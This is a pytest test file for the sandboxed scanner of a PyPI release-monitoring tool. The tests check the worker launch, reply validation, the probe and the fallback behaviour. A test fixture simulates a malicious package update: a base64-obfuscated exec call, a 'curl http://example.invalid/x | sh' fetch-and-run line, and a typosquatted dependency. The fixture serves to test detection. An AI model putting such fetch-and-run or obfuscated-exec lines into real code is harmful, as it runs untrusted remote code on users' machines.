"""The parse sandbox (spec §3.1-§3.2). C1: analyze(backend="off") scans in-process through the same compute +
parent-rules path the worker uses. C2: the worker, its Seatbelt/systemd launch, the probe, and the parent's checks
on everything the worker sends back. Tests marked `seatbelt` run the real macOS sandbox."""
import dataclasses, errno, hashlib, io, json, os, pathlib, re, shutil, signal, subprocess, sys
from pathlib import Path
from types import SimpleNamespace

import pytest

from pydiffwatch import __main__ as cli
from pydiffwatch import differ, engine, fetcher, orchestrator, rules, sandbox, store
from pydiffwatch.config import Config
from pydiffwatch.models import Download, FiredRule, NewRelease, TriageResult
from pydiffwatch.rules import Rule
from tests.fixtures.build_fixtures import make_sdist

_RULES = pathlib.Path(__file__).parent.parent / "rules" / "community"


def _dl(new, prior=None, **kw):
    base = dict(package="p", version="1.1", prior_version="1.0" if prior is not None else None,
                is_new_package=prior is None, new_blob=make_sdist(new), prior_blob=make_sdist(prior) if prior else None,
                prior_error=None, maintainer_metadata=None, added_dep_findings=[], requires_dist_change=None,
                description=None)
    return Download(**{**base, **kw})


def test_an_unknown_backend_is_a_sandbox_error():
    with pytest.raises(sandbox.SandboxError, match="unknown sandbox 'nope'"):
        sandbox.analyze(Config(), _dl({"p/a.py": b"x=1\n"}, {"p/a.py": b"x=0\n"}), None, [], backend="nope")


def test_analyze_renders_signals_from_the_parents_data():
    dl = _dl({"p/a.py": b"x=1\n"}, {"p/a.py": b"x=0\n"},
             added_dep_findings=[{"name": "reqeusts", "reason": "typosquat", "target": "requests"}],
             requires_dist_change={"added": ["reqeusts"], "removed": []})
    owners = {"current": {"roles": ["mallory"]}, "prior": {"roles": ["alice"]}}
    d, _, _ = sandbox.analyze(Config(), dl, owners, rules.load_rules(_RULES))
    assert "dependency reqeusts: typosquat of requests (a popular package)" in d.signals
    assert "maintainer set changed: alice -> mallory" in d.signals
    assert d.added_dep_findings == dl.added_dep_findings


def test_parent_rules_replace_the_scans_and_keep_ruleset_order(monkeypatch):
    rs = [Rule("maint", "maintainer", 20, {"maintainer_changed": True}),
          Rule("code-a", "code", 30, {}), Rule("dep-a", "dep", 25, {})]
    scan_tr = TriageResult(0.0, [FiredRule("code-a", 30.0, "x.py", (1, 1)),
                                 FiredRule("dep-a", 99.0, "forged", (0, 0))], False)   # a scan's dep result
    parent = TriageResult(0.0, [FiredRule("dep-a", 25.0, "reqeusts", (0, 0)),
                                FiredRule("maint", 20.0, "<ownership>", (0, 0))], False)
    monkeypatch.setattr(engine, "triage", lambda d, cfg, rs_, mc=None: parent)
    d = dataclasses.replace(sandbox.differ.build_diff(fetcher.extract_download(
        Config(), _dl({"p/a.py": b"x=1\n"}, {"p/a.py": b"x=0\n"}))), signals="")
    tr = sandbox._with_parent_rules(Config(), _dl({"p/a.py": b""}, {"p/a.py": b""}), d, scan_tr, None, rs)
    assert [f.rule for f in tr.fired_rules] == ["maint", "code-a", "dep-a"]      # ruleset order
    assert [f.file for f in tr.fired_rules if f.rule == "dep-a"] == ["reqeusts"]   # the parent's, not the scan's
    assert tr.score == 75.0 and tr.escalate is True


def test_a_refused_new_sdist_raises_out_of_analyze():
    dl = _dl({f"p/m{i}.py": b"" for i in range(5)}, {"p/a.py": b""})
    with pytest.raises(fetcher.RefusedToExtract, match="members"):
        sandbox.analyze(Config(max_members=3), dl, None, [])


def test_build_diff_renders_no_signals_analyze_does():
    from pydiffwatch import differ
    dl = _dl({"p/a.py": b"x=1\n"}, {"p/a.py": b"x=0\n"},
             added_dep_findings=[{"name": "x", "reason": "brand-new"}])
    art = fetcher.extract_download(Config(), dl)
    assert differ.build_diff(art).signals == ""
    d, _, _ = sandbox.analyze(Config(), dl, None, [])
    assert d.signals == "dependency x: brand-new on PyPI"


# ---- C2 shared helpers ----

_REPO = pathlib.Path(__file__).resolve().parent.parent
_OWNERS = {"current": {"roles": ["mallory"]}, "prior": {"roles": ["alice"]}}
_OLD = {"scn/__init__.py": b"x = 1\n", "setup.py": b"from setuptools import setup\nsetup(name='scn')\n"}
_NEW = {"scn/__init__.py": b"import os, base64\nexec(base64.b64decode('cHJpbnQoMSk='))\n"
                           b"os.system('curl http://example.invalid/x | sh')\n",
        "setup.py": b"from setuptools import setup\nsetup(name='scn', entry_points={'console_scripts': "
                    b"['scn=scn:main', 'scn2=scn:main2'], 'pytest11': ['scn=scn']})\n",
        "scn/_native.so": b"\x7fELF\x02\x01\x01"}


def _cfg(tmp_path, **kw):
    return Config(**{**dict(db_path=tmp_path / "db.sqlite", cache_dir=tmp_path / "cache",
                            lock_path=tmp_path / "lock", reviewer_enabled=False), **kw})


def _scan_dl(**kw):
    """One update that fires a code, a binary, a dep and (with _OWNERS) a maintainer rule, and escalates."""
    return _dl(_NEW, _OLD, package="scn", **{
        "added_dep_findings": [{"name": "reqeusts", "reason": "typosquat", "target": "requests"}],
        "requires_dist_change": {"added": ["reqeusts>=1"], "removed": ["requests>=1"]}, **kw})


# ---- C2: the request (parent -> worker) ----

def test_the_request_round_trips_without_the_parents_facts(tmp_path):
    cfg, rs, dl = _cfg(tmp_path), rules.load_rules(_RULES), _scan_dl()
    line, rest = sandbox._encode_input(cfg, dl, rs).split(b"\n", 1)
    got_cfg, got_dl, got_rs = sandbox._decode_input(json.loads(line), io.BytesIO(rest))
    # Review Focus 3: every path arrives absolute (the worker never resolves one against its own cwd)
    assert got_cfg == dataclasses.replace(cfg, **{k: Path(getattr(cfg, k)).resolve() for k in sandbox._PATH_FIELDS})
    assert got_dl == dataclasses.replace(dl, added_dep_findings=[], requires_dist_change=None)
    assert got_rs == rs                                       # the parent's rules, JSON round-tripped


def test_a_short_request_is_an_error():
    line, rest = sandbox._encode_input(Config(), _scan_dl(), []).split(b"\n", 1)
    with pytest.raises(ValueError, match="ended before its sdists did"):
        sandbox._decode_input(json.loads(line), io.BytesIO(rest[:-1]))


# ---- C2: the reply (worker -> parent) ----

def test_a_genuine_reply_decodes_to_the_in_process_scan():
    cfg, rs, dl = Config(), rules.load_rules(_RULES), _scan_dl()
    art, d, tr = sandbox.compute(cfg, dl, rs)
    got_d, got_tr, prior_error = sandbox._decode_output(sandbox._encode_output(art, d, tr), cfg, dl, rs)
    assert got_d == dataclasses.replace(d, added_dep_findings=[])     # analyze adds the parent's own
    assert got_tr == tr and prior_error == art.prior_error


def _tamper(path, value):
    def edit(out):
        node = out
        for k in path[:-1]:
            node = node[k]
        node[path[-1]] = value
    return edit


_MALFORMED = {
    "a hunk's added lines as a string": _tamper(("diff", "changed", 0, "hunks", 0, "added"), "not a list"),
    "a renamed file": _tamper(("diff", "changed", 0, "change_kind"), "renamed"),
    "a path that is not a string": _tamper(("diff", "changed", 0, "path"), 7),
    "changed as an object": _tamper(("diff", "changed"), {"a": 1}),
    "a rule the parent never loaded": _tamper(("triage", "fired_rules", 0, "rule"), "made-up-rule"),
    "an infinite weight": _tamper(("triage", "fired_rules", 0, "weight"), float("inf")),
    "a negative weight": _tamper(("triage", "fired_rules", 0, "weight"), -1),
    "a weight as a string": _tamper(("triage", "fired_rules", 0, "weight"), "7"),
    "a boolean weight": _tamper(("triage", "fired_rules", 0, "weight"), True),
    "a weight too big for a float": _tamper(("triage", "fired_rules", 0, "weight"), 10 ** 400),
    "three line numbers": _tamper(("triage", "fired_rules", 0, "lines"), [1, 2, 3]),
    "surface_omitted as a string": _tamper(("diff", "surface_omitted"), "3"),
    "prior_error as a number": _tamper(("prior_error",), 5),
    "another release": _tamper(("diff", "version"), "9.9"),
    "another package": _tamper(("diff", "package"), "other"),
    "is_first_release as a string": _tamper(("diff", "is_first_release"), "no"),
    "a binary with a float size": _tamper(("diff", "added_binaries", 0, "size"), 1.5),
    "description missing": lambda out: out["diff"].pop("description"),
}


@pytest.mark.parametrize("what", sorted(_MALFORMED))
def test_a_malformed_reply_is_rejected(what):
    cfg, rs, dl = Config(), rules.load_rules(_RULES), _scan_dl()
    out = json.loads(sandbox._encode_output(*sandbox.compute(cfg, dl, rs)))
    _MALFORMED[what](out)
    with pytest.raises(sandbox.SandboxError):
        sandbox._decode_output(json.dumps(out).encode(), cfg, dl, rs)


@pytest.mark.parametrize("raw", [b"\x00not json", b"[1, 2]", b"\xff\xfe", b"[" * 100_000])
def test_a_reply_that_is_not_a_json_object_is_rejected(raw):
    with pytest.raises(sandbox.SandboxError):
        sandbox._decode_output(raw, Config(), _scan_dl(), [])


def test_a_refusal_inside_the_box_is_a_refusal_and_any_other_error_a_sandbox_error():
    with pytest.raises(fetcher.RefusedToExtract, match="^members$"):
        sandbox._decode_output(b'{"error": "members", "error_type": "RefusedToExtract"}', Config(), _scan_dl(), [])
    with pytest.raises(sandbox.SandboxError, match="^sandbox worker failed: BadGzipFile: Not a gzipped file"):
        sandbox._decode_output(b'{"error": "BadGzipFile: Not a gzipped file"}', Config(), _scan_dl(), [])


_DETERMINISM = ("import sys\n"
                "from pydiffwatch import rules, sandbox\n"
                "from pydiffwatch.config import Config\n"
                "from tests.test_sandbox import _RULES, _scan_dl\n"
                "sys.stdout.buffer.write(sandbox._encode_output(*sandbox.compute(Config(), _scan_dl(), "
                "rules.load_rules(_RULES))))\n")


def test_the_reply_is_byte_identical_across_processes():
    # lesson iii: sort_keys, and no set crosses the pipe (two hash seeds would reorder one that leaked)
    outs = [subprocess.run([sys.executable, "-c", _DETERMINISM], cwd=_REPO, capture_output=True, check=True,
                           env={**os.environ, "PYTHONHASHSEED": seed}).stdout for seed in ("1", "2")]
    assert outs[0] == outs[1] and outs[0].startswith(b'{"diff": {"added_binaries": [')


# ---- C2: launching the worker ----

class _Proc:
    """A fake Popen: records the launch, feeds the worker's stdin to `seen`, replies with stdout/stderr."""
    def __init__(self, returncode=0, stdout=b"{}", stderr=b""):
        self.returncode, self._out, self._err = returncode, stdout, stderr
        self.seen = {}

    def __call__(self, cmd, **kw):
        self.seen.update(kw, cmd=cmd)
        self.stdin, self.stdout, self.stderr = io.BytesIO(), io.BufferedReader(io.BytesIO(self._out)), \
            io.BufferedReader(io.BytesIO(self._err))
        self.stdin.close = lambda: None
        return self

    def __enter__(self):
        return self

    def __exit__(self, *a):
        pass

    def wait(self, timeout=None):
        return self.returncode

    def kill(self):
        pass


def test_the_worker_gets_no_environment_and_no_preexec_fn(monkeypatch):
    # Review Focus 4 / Ruling R2: no preexec_fn while the fetch pool's threads are live
    monkeypatch.setenv("OPENAI_API_KEY", "sk-canary-0123456789")
    fake = _Proc()
    monkeypatch.setattr(sandbox.subprocess, "Popen", fake)
    sandbox._run(Config(), "seatbelt", b"{}\n")
    seen = fake.seen
    assert seen["env"] == {} and seen.get("preexec_fn") is None and "shell" not in seen
    assert "sk-canary" not in str(seen)
    assert seen["cmd"][:2] == ["sandbox-exec", "-p"] and seen["cmd"][3:] == sandbox._worker_argv(Config())
    assert fake.stdin.getvalue() == b"{}\n"


def test_the_worker_sets_its_own_cpu_limit_first():
    # Review Focus 4 / Ruling R2: the limit is set by the child's first statement, before pydiffwatch is imported
    cfg = Config(parse_timeout_s=7.5)
    argv = sandbox._worker_argv(cfg)
    assert argv[:3] == [sys.executable, "-I", "-c"] and argv[3].startswith(sandbox._cpu_limit_code(cfg))
    got = subprocess.run([sys.executable, "-I", "-c", sandbox._cpu_limit_code(cfg) +
                          "import resource; print(resource.getrlimit(resource.RLIMIT_CPU))"],
                         capture_output=True, text=True, check=True, env={})
    assert got.stdout.strip() == "(7, 8)"


def test_systemd_run_gets_only_what_reaches_the_service_manager(monkeypatch):
    monkeypatch.setenv("OPENAI_API_KEY", "sk-canary-0123456789")
    monkeypatch.setenv("PATH", "/usr/bin:/bin")
    fake = _Proc()
    monkeypatch.setattr(sandbox.subprocess, "Popen", fake)
    sandbox._run(Config(), "systemd", b"{}\n")
    assert set(fake.seen["env"]) <= set(sandbox._SYSTEMD_ENV) and fake.seen["env"]["PATH"] == "/usr/bin:/bin"


@pytest.mark.parametrize("outcome,message", [
    (FileNotFoundError(2, "No such file or directory"), r"^could not start the seatbelt sandbox: "),
    (_Proc(returncode=-signal.SIGXCPU), r"^seatbelt sandbox timed out after 120s of CPU$"),
    (_Proc(returncode=1, stderr=b"x" * 2000 + b"\nImportError: the last line"),   # Ruling R6: the tail
     r"^seatbelt sandbox exited 1: x+\nImportError: the last line$"),
])
def test_launch_failures_are_sandbox_errors(outcome, message, monkeypatch):
    def popen(cmd, **kw):
        if isinstance(outcome, BaseException):
            raise outcome
        return outcome(cmd, **kw)
    monkeypatch.setattr(sandbox.subprocess, "Popen", popen)
    with pytest.raises(sandbox.SandboxError, match=message):
        sandbox._run(Config(), "seatbelt", b"{}\n")


def _worker_is(monkeypatch, code):
    monkeypatch.setattr(sandbox, "_seatbelt_cmd", lambda cfg: [sys.executable, "-I", "-c", code])


def test_a_worker_that_hangs_is_killed_at_the_wall_clock(monkeypatch):
    # Ruling R2: on macOS a worker can ignore SIGXCPU; the wall clock is what stops it
    _worker_is(monkeypatch, "import time; time.sleep(60)")
    with pytest.raises(sandbox.SandboxError, match=r"^seatbelt sandbox timed out after 0s$"):
        sandbox._run(Config(parse_timeout_s=-9.8), "seatbelt", b"{}\n")          # a 0.2 s wall clock


def test_a_worker_that_floods_stdout_or_stderr_cannot_make_the_parent_buffer_it(monkeypatch):
    # Review Focus 6 / Ruling R12: a compromised worker writes without bound; the parent keeps at most _reply_cap
    # of stdout and a 500-byte tail of stderr, and the release fails like any other worker failure
    cfg = Config(max_total_bytes=1 << 20)
    _worker_is(monkeypatch, "import sys\nb = b'x' * (1 << 20)\nwhile True: sys.stdout.buffer.write(b)")
    with pytest.raises(sandbox.SandboxError, match=rf"sent back more than {4 << 20} bytes"):
        sandbox._run(cfg, "seatbelt", b"{}\n")
    _worker_is(monkeypatch, "import sys\nsys.stderr.write('y' * (8 << 20) + '\\nlast line'); sys.exit(3)")
    with pytest.raises(sandbox.SandboxError, match=r"^seatbelt sandbox exited 3: y+\nlast line$") as e:
        sandbox._run(cfg, "seatbelt", b"{}\n")
    assert len(str(e.value)) < 600


def test_systemd_command_carries_every_property(tmp_path):
    cfg = Config(db_path=tmp_path / "d" / "db.sqlite", cache_dir=tmp_path / "c", lock_path=tmp_path / "l" / "lock",
                 parse_timeout_s=90.0, parse_memory_max="1G")
    cmd = sandbox._systemd_cmd(cfg)
    assert cmd[:5] == ["systemd-run", "--pipe", "--wait", "--collect", "--quiet"]
    props = {c.removeprefix("--property=") for c in cmd if c.startswith("--property=")}
    assert {"PrivateNetwork=yes", "ProtectSystem=strict", "ProtectHome=tmpfs", "PrivateTmp=yes",
            "NoNewPrivileges=yes", "SystemCallFilter=@system-service", "MemoryMax=1G", "RuntimeMaxSec=90",
            "TasksMax=16"} <= props
    for d in (tmp_path / "d", tmp_path / "l", tmp_path / "c"):
        assert f"InaccessiblePaths=-{os.path.realpath(d)}" in props
    assert {f"BindReadOnlyPaths=-{p}" for p in sandbox._readable()} <= props
    assert ("PrivateUsers=yes" in props) == (os.geteuid() != 0)
    assert cmd[cmd.index("--") + 1:] == sandbox._worker_argv(cfg)


def test_the_seatbelt_profile_quotes_and_resolves_every_path(tmp_path):
    # Review Focus 2 and 3: a space, quotes and a backslash in a path; a DB dir reached through a symlink
    assert sandbox._quote('/a "b\\c') == '"/a \\"b\\\\c"'
    real = tmp_path / 'data "q" \\ dir'
    real.mkdir()
    (tmp_path / "link").symlink_to(real)
    cfg = Config(db_path=tmp_path / "link" / "db.sqlite", cache_dir=tmp_path / "c", lock_path=tmp_path / "l")
    prof = sandbox._seatbelt_profile(cfg)
    assert f"(subpath {sandbox._quote(os.path.realpath(real))})" in prof
    assert sandbox._quote(str(tmp_path / "link")) not in prof       # Seatbelt matches real paths only
    # Ruling R13: HOME and the checkout the package is imported from are closed; the allow line re-opens only the
    # package and the import path
    assert f"(deny file-read-data (subpath {sandbox._quote(sandbox._home())}) " \
           f"(subpath {sandbox._quote(str(sandbox._ROOT))}))" in prof
    assert "(deny signal)\n" in prof                                 # no SIGSTOP/SIGKILL to the daemon
    assert sandbox._quote(str(Path(cfg.rules_dir).resolve())) not in prof   # rules travel in the request
    assert prof.index("(deny file-read-data (subpath") < prof.index("(allow file-read-data") \
        < prof.rindex("(deny file-read-data")                        # later rules win


# ---- C2: the parent trusts nothing the worker computes ----

def _reply(cfg, dl, ruleset):
    """The worker's genuine reply for dl, as a dict to tamper with."""
    return json.loads(sandbox._encode_output(*sandbox.compute(cfg, dl, ruleset)))


def _worker_says(monkeypatch, reply):
    monkeypatch.setattr(sandbox, "_run", lambda cfg, backend, payload: json.dumps(reply).encode())


def test_the_request_carries_the_parents_rules_and_none_of_its_own_facts(tmp_path, monkeypatch):
    cfg, rs, dl = _cfg(tmp_path), rules.load_rules(_RULES), _scan_dl()
    seen = {}

    def run(cfg_, backend, payload):
        seen["payload"] = payload
        return sandbox._encode_output(*sandbox.compute(cfg_, dl, rs))
    monkeypatch.setattr(sandbox, "_run", run)
    sandbox.analyze(cfg, dl, _OWNERS, rs, backend="seatbelt")
    line, blobs = seen["payload"].split(b"\n", 1)
    head = json.loads(line)
    assert line == json.dumps(head, sort_keys=True).encode()
    assert set(head) == {"cfg", "dl", "rules", "sys_path"}
    assert not {"owners", "maintainer_context", "added_dep_findings", "requires_dist_change"} & \
        (set(head) | set(head["dl"]))
    assert [r["id"] for r in head["rules"]] == [r.id for r in rs] and "reviewer" not in head["cfg"]
    assert all(os.path.isabs(head["cfg"][k]) for k in sandbox._PATH_FIELDS)
    assert blobs == dl.new_blob + dl.prior_blob


def test_the_parent_recomputes_score_and_escalation(monkeypatch):
    cfg, rs = Config(), rules.load_rules(_RULES)
    dl = _scan_dl(added_dep_findings=[], requires_dist_change=None)
    prim = {"rule": "primitives", "weight": 20.0, "file": "scn/__init__.py", "lines": [1, 3]}
    reply = _reply(cfg, dl, rs)
    reply["triage"] = {"fired_rules": [prim, prim], "score": 0, "escalate": False}
    _worker_says(monkeypatch, reply)
    _, tr, _ = sandbox.analyze(cfg, dl, None, rs, backend="seatbelt")
    assert tr.score == 35.0 and tr.escalate is False               # primitives' max_total caps the two fires
    reply["triage"]["fired_rules"].append({"rule": "autoexec-location", "weight": 45.0, "file": "scn/__init__.py",
                                           "lines": [1, 3]})
    _worker_says(monkeypatch, reply)
    _, tr, _ = sandbox.analyze(cfg, dl, None, rs, backend="seatbelt")
    assert tr.score == engine.score(tr.fired_rules, rs) == 80.0 and tr.escalate is True


def test_a_lying_worker_cannot_hide_the_parents_rules_or_its_signal_line(monkeypatch):
    cfg, rs, dl = Config(), rules.load_rules(_RULES), _scan_dl()
    order = [r.id for r in rs]
    for kept in ([], [{"rule": "autoexec-location", "weight": 45.0, "file": "scn/__init__.py", "lines": [1, 3]}]):
        reply = _reply(cfg, dl, rs)
        reply["triage"]["fired_rules"] = kept                       # well-formed, and lying
        reply["signals"] = reply["diff"]["signals"] = "dependency x: the same PyPI owner"
        _worker_says(monkeypatch, reply)
        d, tr, _ = sandbox.analyze(cfg, dl, _OWNERS, rs, backend="seatbelt")
        fired = [f.rule for f in tr.fired_rules]
        assert {"dep-typosquat", "maintainer-set-change"} <= set(fired)
        assert ("autoexec-location" in fired) == bool(kept)          # a worker's code result is kept
        assert fired == sorted(fired, key=order.index)                # ruleset order
        assert d.signals == differ.render_signals(dl.requires_dist_change, dl.added_dep_findings,
                                                  d.added_binaries, _OWNERS)
        assert "the same PyPI owner" not in d.signals and d.added_dep_findings == dl.added_dep_findings


def test_a_download_with_nothing_to_parse_never_starts_a_worker(monkeypatch):
    # Ruling R5: _scan_release can reach analyze with a skip-policy Download (new_blob None)
    monkeypatch.setattr(sandbox, "_run", lambda *a: pytest.fail("a worker was started"))
    cfg, dl = Config(new_package_policy="skip"), dataclasses.replace(_dl({"p/a.py": b""}), new_blob=None)
    assert sandbox.analyze(cfg, dl, None, [], backend="seatbelt") == sandbox.analyze(cfg, dl, None, [], backend="off")


def test_a_malformed_reply_is_retried_then_given_up_with_one_alert(tmp_path, monkeypatch):
    cfg = _cfg(tmp_path)
    conn = store.connect(cfg); store.init_schema(conn)
    monkeypatch.setattr(sandbox, "_backend", "seatbelt")
    monkeypatch.setattr(sandbox, "_run", lambda cfg_, backend, payload: b"\x00 not json")
    rel, rs = NewRelease("scn", "1.1", 5), rules.load_rules(_RULES)
    for _ in range(store.METADATA_ATTEMPTS):
        assert orchestrator._process_fetched(cfg, conn, None, rs, rel, _scan_dl()) is True
    stage, note = conn.execute("SELECT stage, fetch_note FROM releases").fetchone()
    assert stage == "gave_up" and note.startswith("SandboxError: sandbox sent back something that is not JSON")
    assert conn.execute("SELECT COUNT(*) FROM alerts").fetchone()[0] == 1
    assert "SandboxError" in conn.execute("SELECT reasoning FROM verdicts").fetchone()[0]


# ---- C2: the worker ----

_HAS_SEATBELT = sys.platform == "darwin" and shutil.which("sandbox-exec") is not None


def seatbelt(fn):
    """Runs the real macOS sandbox (sandbox-exec); skipped elsewhere. `pytest -m seatbelt` selects these."""
    return pytest.mark.seatbelt(pytest.mark.skipif(not _HAS_SEATBELT, reason="needs macOS sandbox-exec")(fn))


def _no_sandbox(monkeypatch):
    """Run the real worker process without sandbox-exec, on any OS: the pipe protocol end to end."""
    monkeypatch.setattr(sandbox, "_seatbelt_cmd", lambda cfg: sandbox._worker_argv(cfg))


def test_the_worker_round_trip_matches_the_in_process_scan_without_a_sandbox(monkeypatch):
    _no_sandbox(monkeypatch)
    cfg, rs = Config(), rules.load_rules(_RULES)
    assert sandbox.analyze(cfg, _scan_dl(), _OWNERS, rs, backend="seatbelt") == \
        sandbox.analyze(cfg, _scan_dl(), _OWNERS, rs, backend="off")


def test_a_refusal_in_the_worker_is_a_refusal(monkeypatch):
    _no_sandbox(monkeypatch)
    with pytest.raises(fetcher.RefusedToExtract, match="^members$"):
        sandbox.analyze(Config(max_members=1), _scan_dl(), None, [], backend="seatbelt")


def test_a_crash_in_the_worker_is_a_sandbox_error(monkeypatch):
    _no_sandbox(monkeypatch)
    with pytest.raises(sandbox.SandboxError, match="^sandbox worker failed: BadGzipFile"):
        sandbox.analyze(Config(), _scan_dl(new_blob=b"not a gzip"), None, [], backend="seatbelt")


@seatbelt
def test_the_sandboxed_scan_equals_the_in_process_scan_and_escalates(tmp_path):
    cfg, rs = _cfg(tmp_path), rules.load_rules(_RULES)
    for dl in (_scan_dl(), _scan_dl(prior_blob=b"not a tarball")):    # the second's prior_error crosses too
        got = sandbox.analyze(cfg, dl, _OWNERS, rs, backend="seatbelt")
        assert got == sandbox.analyze(cfg, dl, _OWNERS, rs, backend="off")   # Diff incl. signals, triage, prior_error
        assert got[1].escalate
    assert got[2].startswith("prior 1.0 sdist unavailable (")


@seatbelt
def test_a_refused_sdist_is_reported_as_refused_not_as_a_crash(tmp_path):
    with pytest.raises(fetcher.RefusedToExtract, match="^members$"):
        sandbox.analyze(_cfg(tmp_path, max_members=1), _scan_dl(), None, rules.load_rules(_RULES), backend="seatbelt")


@seatbelt
def test_the_worker_uses_the_rules_the_parent_loaded_not_the_files_on_disk(tmp_path):
    only = rules.validate_rule({"id": "parent-only-rule", "applies_to": "code", "weight": 7,
                                "match": {"bound_call": {"category": "process"}}})
    _, tr, _ = sandbox.analyze(_cfg(tmp_path), _scan_dl(), None, [only], backend="seatbelt")
    assert [f.rule for f in tr.fired_rules] == ["parent-only-rule"]


@seatbelt
def test_the_pipeline_stores_a_sandboxed_scan(tmp_path, monkeypatch):
    cfg = _cfg(tmp_path)
    monkeypatch.setattr(sandbox, "_backend", "seatbelt")
    conn = store.connect(cfg); store.init_schema(conn)
    assert orchestrator._process_fetched(cfg, conn, None, rules.load_rules(_RULES), NewRelease("scn", "1.1", 5),
                                         _scan_dl()) is True
    stage, score = conn.execute("SELECT stage, triage_score FROM releases").fetchone()
    assert stage in ("triaged", "pending_review") and score >= cfg.threshold_t


@seatbelt
def test_a_multi_megabyte_reply_crosses_the_pipe_intact(tmp_path):
    # far over the 64 KiB pipe buffer: 200 changed files of about 7 KiB each. It takes ≈4 s, almost all of it the
    # two difflib passes over 200 × 900-line files (in-process and in the worker), not the pipe.
    new = {f"big/m{i}.py": (f"x_{i} = 1\n" * 900).encode() for i in range(200)}
    old = {f"big/m{i}.py": (f"x_{i} = 0\n" * 900).encode() for i in range(200)}
    cfg, rs, dl = _cfg(tmp_path), rules.load_rules(_RULES), _dl(new, old, package="big")
    assert sandbox.analyze(cfg, dl, None, rs, backend="seatbelt") == sandbox.analyze(cfg, dl, None, rs, backend="off")


_BOUNDARY = ("import os, sys\n"
             "def tried(fn):\n"
             "    try:\n"
             "        fn()\n"
             "    except OSError:\n"
             "        return 'blocked'\n"
             "    return 'open'\n"
             "root, pkg = sys.argv[1], sys.argv[2]\n"
             "print(tried(lambda: open(os.path.join(root, 'pyproject.toml'), 'rb').read(1)),\n"
             "      tried(lambda: os.listdir(root)),\n"
             "      tried(lambda: open(os.path.join(pkg, 'sandbox.py'), 'rb').read(1)),\n"
             "      tried(lambda: os.kill(os.getppid(), 0)),\n"
             "      tried(lambda: os.kill(os.getpid(), 0)))\n")


@seatbelt
def test_the_profile_closes_the_checkout_and_other_processes_but_not_the_package(tmp_path):
    # Review Focus 7 / Ruling R13: outside HOME, only (deny file-read-data (subpath _ROOT)) keeps the checkout's
    # other files closed (pyproject.toml here; .diffwatch-conf/, pydiffwatch.toml, internal/ in a real checkout);
    # the root stays listable and the package readable, or the import fails. (deny signal): a hijacked worker
    # cannot stop the daemon with SIGSTOP/SIGKILL, yet may still signal itself.
    got = subprocess.run(["sandbox-exec", "-p", sandbox._seatbelt_profile(_cfg(tmp_path)), sys.executable, "-I",
                          "-c", _BOUNDARY, str(sandbox._ROOT), str(sandbox._PKG)],
                         capture_output=True, text=True, check=True, env={})
    assert got.stdout.split() == ["blocked", "open", "open", "blocked", "open"]


# ---- C2: proving the sandbox holds ----

_HELD = {"network": "blocked", "write": "blocked", "home_read": "blocked", "db_read": "blocked",
         "exec": "blocked", "services": "blocked", "env": "clean"}


def test_auto_uses_the_platform_sandbox_when_the_probe_holds():
    which = lambda b: "/usr/bin/" + b                                 # noqa: E731
    assert sandbox.choose(Config(), which=which, probe=lambda c, b: _HELD, platform="darwin") == "seatbelt"
    linux = {**_HELD, "exec": "open", "services": "n/a", "home_read": "unknown"}   # the unit's limits, not exec's
    assert sandbox.choose(Config(), which=which, probe=lambda c, b: linux, platform="linux") == "systemd"


def test_auto_without_a_working_sandbox_scans_in_process_and_says_so(capsys, caplog):
    leaky = {**_HELD, "exec": "open"}
    assert sandbox.choose(Config(), which=lambda b: b, probe=lambda c, b: leaky, platform="darwin") == "off"
    assert sandbox.choose(Config(), which=lambda b: None, probe=None, platform="linux") == "off"
    out = capsys.readouterr().out
    assert out.count("[pydiffwatch] WARNING: scanning WITHOUT a sandbox (") == 2
    assert "the seatbelt sandbox did not hold: " in out
    assert "no sandbox-exec (macOS) or systemd-run (Linux) on this machine" in out
    assert out.count('Set parse_sandbox = "on" to refuse to scan instead.') == 2
    assert [r.levelname for r in caplog.records if "WITHOUT a sandbox" in r.getMessage()] == ["WARNING", "WARNING"]


def test_auto_falls_back_when_the_probe_cannot_run(capsys):
    def broken(c, b):
        raise sandbox.SandboxError("seatbelt sandbox exited 65: bad profile")
    assert sandbox.choose(Config(), which=lambda b: b, probe=broken, platform="darwin") == "off"
    assert "the seatbelt sandbox could not run: seatbelt sandbox exited 65" in capsys.readouterr().out


def test_on_refuses_to_scan_without_a_working_sandbox():
    with pytest.raises(sandbox.SandboxError, match='^parse_sandbox = "on" but no sandbox-exec'):
        sandbox.choose(Config(parse_sandbox="on"), which=lambda b: None, probe=None, platform="linux")
    with pytest.raises(sandbox.SandboxError, match='^parse_sandbox = "on" but the seatbelt sandbox did not hold'):
        sandbox.choose(Config(parse_sandbox="on"), which=lambda b: b, probe=lambda c, b: {**_HELD, "db_read": "open"},
                       platform="darwin")


def test_off_never_probes():
    assert sandbox.choose(Config(parse_sandbox="off"), which=None, probe=None, platform="darwin") == "off"


def test_a_probe_reply_missing_a_check_is_rejected_and_leaves_no_files(tmp_path, monkeypatch):
    cfg, seen = _cfg(tmp_path), {}
    monkeypatch.setenv("PYDIFFWATCH_CANARY_KEY", "sk-canary-0123456789")

    def run(cfg_, backend, payload):
        seen["head"] = json.loads(payload)
        return json.dumps({k: v for k, v in _HELD.items() if k != "services"}).encode()
    monkeypatch.setattr(sandbox, "_run", run)
    with pytest.raises(sandbox.SandboxError, match="probe result"):
        sandbox.probe(cfg, "seatbelt")
    head = seen["head"]
    assert head["probe"] is True and head["db_file"].startswith(os.path.realpath(tmp_path))
    assert hashlib.sha256(b"sk-canary-0123456789").hexdigest() in head["env_hashes"]
    assert "sk-canary" not in json.dumps(head)                        # hashes only, never the values
    assert list(tmp_path.glob(".sandbox-probe-*")) == []


def test_a_worker_that_cannot_import_its_scan_code_fails_the_probe(tmp_path, monkeypatch):
    # Review Focus 1 / Ruling R3: a `pip install --user` layout leaves PyYAML unreadable inside the box; the probe
    # must fail (so choose falls back or refuses) rather than hold while every scan fails. No sandbox, any OS.
    shadow = tmp_path / "shadow"
    shadow.mkdir()
    (shadow / "yaml.py").write_text("raise ImportError('yaml is not readable here')\n")
    real = sandbox._import_paths
    monkeypatch.setattr(sandbox, "_import_paths", lambda: [str(shadow)] + real())
    monkeypatch.setattr(sandbox, "_seatbelt_cmd", lambda cfg: sandbox._worker_argv(cfg))
    with pytest.raises(sandbox.SandboxError, match="yaml is not readable here"):
        sandbox.probe(_cfg(tmp_path), "seatbelt")


@pytest.mark.parametrize("error,seen", [
    (PermissionError(errno.EPERM, "Operation not permitted"), "blocked"),          # Seatbelt's deny
    (OSError(errno.ENETUNREACH, "Network is unreachable"), "blocked"),            # PrivateNetwork=yes
